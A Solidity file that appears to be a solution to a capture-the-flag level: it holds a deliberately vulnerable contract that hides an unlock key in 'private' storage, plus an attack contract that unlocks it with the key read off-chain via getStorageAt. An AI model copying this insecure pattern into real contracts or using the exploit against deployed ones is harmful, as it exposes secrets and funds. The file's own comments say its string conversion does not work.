// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {
    // slot 1 - 1 byte
    bool public locked = true;
    // slot 2 - 32 bytes
    uint256 public ID = block.timestamp;
    // slot 3 - 1 byte
    uint8 private flattening = 10;
    // slot 3 - 1 byte
    uint8 private denomination = 255;
    // slot 3 - 2 bytes
    uint16 private awkwardness = uint16(now);
    // slot 4 - 5 - 6
    bytes32[3] private data;

    // data[2] is at slot 5
    constructor(bytes32[3] memory _data) public {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

contract AttackPrivacy {
    Privacy privacy;

    constructor(Privacy _privacy) public {
        privacy = _privacy;
    }

    function stringToBytes32(string memory source)
        public
        pure
        returns (bytes32 result)
    {
        assembly {
            result := mload(add(source, 32))
        }
    }

    // key from calling await web3.eth.getStorageAt(contract.address, 5) in Brave dev console
    bytes32 longKey =
        stringToBytes32(
            "0x0f43f7e660d880169c816346d7aa94d163a31f8ad1cb80551c40f05987f199d0"
        );

    // NOTE: conversion of string literal of the key to bytes32 value DOESN'T work
    // so I have to resort to manually pick out the bytes16 value here
    // basically, converting bytes32 to bytes16 will remove 16 bytes from the right of the bytes32 value
    // e.g. If the value of b32 is 0x5468697320697320612062696720737472696e67000000000000000000000000
    // The value of b16 will be 0x54686973206973206120626967207374

    // Reference: https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183

    function attack() public {
        privacy.unlock(bytes16(longKey));
    }
}
